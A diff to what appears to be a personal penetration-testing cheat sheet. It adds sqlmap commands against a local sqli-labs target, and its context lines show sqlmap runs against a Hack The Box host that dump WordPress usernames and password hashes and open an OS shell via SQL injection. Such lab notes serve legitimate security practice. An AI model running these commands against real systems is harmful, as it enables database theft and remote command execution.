@@ -6,6 +6,8 @@ sudo wget -P /usr/share/wfuzz/wordlist/Injections/ https://raw.githubusercontent
 
 # sqlmap
 ```bash
+sqlmap -u http://127.0.0.1/sqlilabs/Less-2/?id=1 -dbs
+sqlmap -u http://127.0.0.1/sqlilabs/Less-2/?id=1 -dbs --risk=3 --level=5
 sqlmap -u 'https://phoenix.htb/forum/?subscribe_topic=*' --technique=T
 sqlmap -u 'https://phoenix.htb/forum/?subscribe_topic=*' --technique=T --level 5 --risk 3 --dbms=mysql --dbs --batch
 sqlmap -u 'https://phoenix.htb/forum/?subscribe_topic=*' --technique=T --level 5 --risk 3 --dbms=mysql --dump -D wordpress -T wp_users -C user_login,user_pass
@@ -53,6 +55,9 @@ sqlmap -r post.txt -p mail-list --os-shell --web-root "/var/www/html/"
 ```
 
 ## sqlmap for two level injection
+```
+
+```
 
 # ffuf
 
